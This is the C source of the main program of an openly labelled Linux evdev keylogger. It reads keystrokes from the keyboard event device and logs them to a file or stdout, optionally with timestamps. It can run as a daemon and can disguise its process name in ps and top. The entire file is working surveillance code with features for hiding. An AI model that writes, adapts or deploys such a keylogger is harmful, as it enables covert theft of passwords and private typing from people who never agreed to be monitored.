/*
 * logger.c
 *
 * Copyright 2012 Jason A. Donenfeld <Jason@zx2c4.com>. All Rights Reserved.
 *
 * Logs keys with evdev.
 *
 *
 * TODO:
 *   - Get delay time between key key repeat from X server.
 *
 */

#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <getopt.h>
#include "keymap.h"
#include "evdev.h"
#include "process.h"
#include "util.h"


int main(int argc, char *argv[])
{
	char buffer[256];
	char event_device[256];
	char *log_file, *pid_file, *process_name, option;
	int evdev_fd, daemonize, force_us_keymap, option_index, log_time;
	FILE *log, *pid;
	struct input_event ev;
	struct input_event_state state;

	static struct option long_options[] = {
		{"daemonize", no_argument, NULL, 'd'},
		{"foreground", no_argument, NULL, 'f'},
		{"force-us-keymap", no_argument, NULL, 'u'},
		{"log-time", no_argument, NULL, 't'},
		{"event-device", required_argument, NULL, 'e'},
		{"log-file", required_argument, NULL, 'l'},
		{"pid-file", required_argument, NULL, 'p'},
		{"process-name", required_argument, NULL, 'n'},
		{"help", no_argument, NULL, 'h'},
		{0, 0, 0, 0}
	};

	strcpy(event_device, "auto");
	log_file = 0;
	log_time = 0;
	log = stdout;
	pid_file = 0;
	process_name = 0;
	daemonize = 0;
	force_us_keymap = 0;

	close(STDIN_FILENO);

	while ((option = getopt_long(argc, argv, "dfute:l:p:n:h", long_options, &option_index)) != -1) {
		switch (option) {
			case 'd':
				daemonize = 1;
				break;
			case 'f':
				daemonize = 0;
				break;
			case 'u':
				force_us_keymap = 1;
				break;
			case 't':
				log_time = 1;
				break;
			case 'e':
				strncpy(event_device, optarg, sizeof(event_device));
				break;
			case 'l':
				log_file = optarg;
				break;
			case 'p':
				pid_file = optarg;
				break;
			case 'n':
				process_name = optarg;
				break;
			case 'h':
			case '?':
			default:
				fprintf(stderr, "Evdev Keylogger by zx2c4\n\n");
				fprintf(stderr, "Usage: %s [OPTION]...\n", argv[0]);
				fprintf(stderr, "  -d, --daemonize                     run as a background daemon\n");
				fprintf(stderr, "  -f, --foreground                    run in the foreground (default)\n");
				fprintf(stderr, "  -u, --force-us-keymap               instead of auto-detection, force usage of built-in US keymap\n");
				fprintf(stderr, "  -e DEVICE, --event-device=DEVICE    use event device DEVICE (default=auto-detect)\n");
				fprintf(stderr, "  -t --log-time                       write timestamp to log\n");
				fprintf(stderr, "  -l FILE, --log-file=FILE            write key log to FILE (default=stdout)\n");
				fprintf(stderr, "  -p FILE, --pid-file=FILE            write the pid of the process to FILE\n");
				fprintf(stderr, "  -n NAME, --process-name=NAME        change process name in ps and top to NAME\n");
				fprintf(stderr, "  -h, --help                          display this message\n");
				return option == 'h' ? EXIT_SUCCESS : EXIT_FAILURE;
		}
	}

	if (!strcmp(event_device, "auto")) {
		if (find_default_keyboard(event_device, sizeof(event_device)) == -1) {
			fprintf(stderr, "Could not find default event device.\nTry passing it manually with --event-device.\n");
			return EXIT_FAILURE;
		}
	}
	if (log_file && strlen(log_file) != 1 && log_file[0] != '-' && log_file[1] != '\0') {
		if (!(log = fopen(log_file, "w"))) {
			perror("fopen");
			return EXIT_FAILURE;
		}
		close(STDOUT_FILENO);
	}

	if ((evdev_fd = open(event_device, O_RDONLY | O_NOCTTY)) < 0) {
		perror("open");
		fprintf(stderr, "Perhaps try running this program as root.\n");
		return EXIT_FAILURE;
	}

	if (!force_us_keymap) {
		if (load_system_keymap())
			fprintf(stderr, "Failed to load system keymap. Falling back onto built-in US keymap.\n");
	}
	if (pid_file) {
		pid = fopen(pid_file, "w");
		if (!pid) {
			perror("fopen");
			return EXIT_FAILURE;
		}
	}
	if (daemonize) {
		if (daemon(0, 1) < 0) {
			perror("daemon");
			return EXIT_FAILURE;
		}
	}
	if (pid_file) {
		if (fprintf(pid, "%d\n", getpid()) < 0) {
			perror("fprintf");
			return EXIT_FAILURE;
		}
		fclose(pid);
	}

	/* DO NOT REMOVE ME! */
	drop_privileges();

	if (process_name)
		set_process_name(process_name, argc, argv);

	memset(&state, 0, sizeof(state));
	while (read(evdev_fd, &ev, sizeof(ev)) > 0) {
		if (translate_event(&ev, &state, buffer, sizeof(buffer)) > 0) {
			if (log_time == 1) {
				fprintf(log, "%ju %s\n", get_timestamp(), buffer);
			} else {
				fprintf(log, "%s", buffer);
			}
			fflush(log);
		}
	}

	fclose(log);
	close(evdev_fd);

	perror("read");
	return EXIT_FAILURE;
}
